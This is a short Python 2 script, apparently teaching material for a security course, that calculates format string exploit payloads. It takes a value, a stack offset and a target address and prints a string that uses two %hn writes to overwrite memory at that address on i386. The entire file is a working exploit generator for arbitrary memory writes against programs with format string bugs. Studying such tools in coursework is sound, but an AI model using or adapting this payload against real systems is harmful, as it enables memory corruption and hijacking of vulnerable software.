#!/usr/bin/env python

import sys

"""
The Magic: a simple calculator to prepare a format string exploit.

Beware, we make many assumptions (after all, this is just for teaching
purposes).

Brought to you by jinblack and phretor.

(c)2014. No animals were killed while writing this code.
"""

def hex_to_bytes(s):
    """
    Convert a 32-bit address written in hex to the corresponding bytes.
    """
    s = s[2:]                   #remove initial 0x
    b =  chr(int(s[0:2], 16))   #1st byte
    b += chr(int(s[2:4], 16))   #2nd byte
    b += chr(int(s[4:6], 16))   #4rd byte
    b += chr(int(s[6:8], 16))   #5th byte
    return b

def bytes_to_hex_string(s):
    return ''.join('\\x%02x' % ord(z) for z in s)

def main():
    if len(sys.argv) < 4:
        print '%s 0x<value to write> <first pos on stack> 0x<target address>' % sys.argv[0]
        print
        print '  0x<target address>     Where to write'
        print '  0x<value to write>     What to write'
        print '  <first pos on stack>   Where the 0x<value to write> is placed on the stack'
        print
        sys.exit(1)

    DEBUG = False
    if len(sys.argv) > 4:                        # debug
        DEBUG = True

    # n-th argument and n-th argument + 1 (decimal)
    npos = (int(sys.argv[2]), int(sys.argv[2])+1)

    # value (hex) converted to bytes
    val = hex_to_bytes(sys.argv[1])

    # split in high and low part
    val_first = ord(val[0]) * 256 + ord(val[1])
    val_second  = ord(val[2]) * 256 + ord(val[3])

    # target address (hex)
    addr  = hex_to_bytes(sys.argv[3])           # target
    addr2 = addr[0:3] + chr(ord(addr[3]) + 2)   # target + 2 bytes

    # make it little endian to make i386 happy
    addr = addr[::-1]
    addr2 = addr2[::-1]

    # select the order
    if val_first > val_second:              # first we write the lower
        s = (val_second, val_first)
        c = addr + addr2                    # first + second
    else:                                   # otherwise we need to swap both
        s = (val_first, val_second)
        c = addr2 + addr                    # second + first

    # corner case (example): value is 0x41414141 ~> 0x4141 | 0x4141
    if s[1] - s[0] > 0:
        second = '%%%05dx' % (s[1] - s[0])  # pull a second value from the stack
    else:
        second = ''                         # no need to pull another value from the stack

    if DEBUG:
        d = (c[0:4], c[4:8])
        c = bytes_to_hex_string(d[0]) + bytes_to_hex_string(d[1])

    """
    Exploit format:

    %<low addr>x %<low addr + 2>x %<low value - printed - 8>$hn %<high value - low value>$hn
    """
    sys.stdout.write(c + "%%%05dc%%%05d$hn%s%%%05d$hn" % (s[0]-8, npos[0], second, npos[1]))

    if DEBUG:
        sys.stdout.write('\n')

    return 0

if __name__ == '__main__':
    sys.exit(main())
